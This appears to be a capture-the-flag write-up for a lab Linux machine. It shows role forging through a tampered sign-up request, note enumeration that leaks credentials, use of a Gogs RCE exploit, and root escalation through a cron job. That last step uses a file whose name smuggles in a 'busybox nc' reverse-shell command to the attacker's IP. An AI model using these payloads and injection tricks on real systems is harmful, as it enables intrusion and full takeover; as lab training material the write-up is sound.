#Pwned #Wildcards #Linux #PathTraversal #CronJobs 
```IP
192.168.236.224
```
## Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.236.224 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                   
| ssh-hostkey:            
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFR/u8yZrrxkDWw/8gy/fNFksvT+QIL8O/6eD8zVxwKwgBURa9uRtOC8Dk6P+ktLwXJ9oSUitZeXVWjijbehpZBVHvywEOj9nc0bmk0+M/DGGbr1etS7cDvRzRATUtMPxQfYhzXqHlZe6Q2GfA0c75uybUXxOha8CTdK0Iv/maUUaiaPv3LGebQ4CpNaXNQfYVpC
dsxLn5MxFi+tfenn/4CinBPn1Ahnx499V1G0ANTaKLsEETjqaMd5jnmml2wH1GmKfKf/6FevWv0Q9Ylsi3x/ipkDpcQAMRQ/aw5NuSSDrGTdo0wRuuoEf5Ybenp9haPVxUAPHbEcMI2hdcP5B3Cd03qimMhHEkFXE8sTUxRKHG+hg7cF8On1EXZsH1fsVyrFAAoHRrap5CsubmNXT93EcK7lc65DbKgeqls643x0p/4W
OUiLXFstm6X4JCdEyhvWmnYtL3qDKMuQbCwrCJGeDjoaZTjHXbpjSxSnvtO04RT84x2t8MThyeYO3kSyM=
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBWjceIJ9NSOLk8zk68zCychWoLxrcrsuJYy2C1pvpfOhVBrr8QBhYbJxzzGJ7DpuMT/DXiCwuLXdu0zeR4/Dk=
|   256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG3LJwn9us7wxvkL0E6EEgOPG3P0fa0fRVuJuXeASZvs
80/tcp   open  http     syn-ack ttl 61
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E     
|_http-title: notes.pg
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, Termina
lServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
8000/tcp open  http-alt syn-ack ttl 61
|_http-title: Gogs
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=30716a014753f3da; Path=/; HttpOnly          
|     Set-Cookie: _csrf=R-cRDmh7DsUZN0CfJvoiX1BC8oA6MTcyODg5MzE1NDcyNDYzNzA2Mw; Path=/; Domain=assignment.pg; Expires=Tue, 15 Oct 2024 08:05:54 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Mon, 14 Oct 2024 08:05:54 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>              
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="R-cRDmh7DsUZN0CfJvoiX1BC8oA6MTcyODg5Mz  
|   GenericLines:
|     HTTP/1.1 400 Bad Request  
```

## HTTP

It is possible to create a new user, so we create user test. When accessing with our new user, we see other users and among them various variables containing credentials:
```
authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=
```
The credentials being: `forged_owner:forged_owner`. Now we can log in with the new credentials and create notes as shown below:


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014105705.png?raw=true)

When created, we can see that every note has its own name, which is an iterative number. We can try to access other previously created notes by changing the URL number as shown below:


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014105725.png?raw=true)

In the first note we get a set of credentials:
```
svc-dev2022@@@!;P;4SSw0Rd
```

With this new set of credentials we can leverage a GOGs vulnerability. This service is present in the port 8000 as shown in our nmap output. The exploit I have used is the following:
https://github.com/Ressurect0/Gogs-RCE?tab=readme-ov-file

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014111732.png?raw=true)

Once executed, we have remote access to the machine as user `jane`.
# PrivEsc

### Peass
With winpeas we locate a suspicious cron job that is executing the following bash file every minute:

```
/usr/bin/clean-tmp.sh
```
This file is using the find command over /usr/shm directory and then removing all files contained in it. By creating a file named as `$(any_command)` it is possible to execute a command inside our initial command. After some trial and error I set up a listener in our kali machine an manage to execute a reverse shell creating a file with the following command:

```
echo '$(busybox nc 192.168.45.164 4444 -e sh)'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014120107.png?raw=true)

Now we are root!

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014120128.png?raw=true)

